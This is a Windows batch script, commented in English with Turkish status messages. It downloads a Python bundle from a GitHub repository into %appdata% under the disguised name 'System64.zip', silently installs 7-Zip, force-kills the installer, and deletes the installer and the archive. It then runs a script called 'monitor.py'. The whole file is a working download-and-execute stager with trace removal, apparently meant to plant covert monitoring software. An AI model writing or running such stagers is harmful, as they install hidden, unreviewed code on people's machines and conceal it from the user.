@echo off

REM Change to the %appdata% directory
cd %appdata%

REM Download python.zip
powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/python.zip' -OutFile '%appdata%\System64.zip'; Write-Host 'Python.zip indirildi' } catch { Write-Host 'Hata: $_' }"

REM Download 7zip.exe
powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/7zip.exe' -OutFile '%appdata%\7zip.exe'; Write-Host '7zip.exe indirildi' } catch { Write-Host 'Hata: $_' }"

REM Install 7zip silently
start /wait %appdata%\7zip.exe /S

REM Wait 1 second before closing any remaining installer windows
timeout /t 1 /nobreak >nul
taskkill /f /im 7zip.exe 2>nul
taskkill /f /im 7z*.exe 2>nul

REM Wait 1 second before deleting the installer
timeout /t 1 /nobreak >nul
del /f /q %appdata%\7zip.exe

REM Extract System64.zip using 7zip
"%ProgramFiles%\7-Zip\7z.exe" x -y "%appdata%\System64.zip" -o"%appdata%"

REM Wait 1 second before deleting the System64.zip file
timeout /t 1 /nobreak >nul
del /f /q "%appdata%\System64.zip"

REM Run the Python script
"%appdata%\System64\python.exe" "%appdata%\System64\monitor.py"

echo Islem tamamlandi.
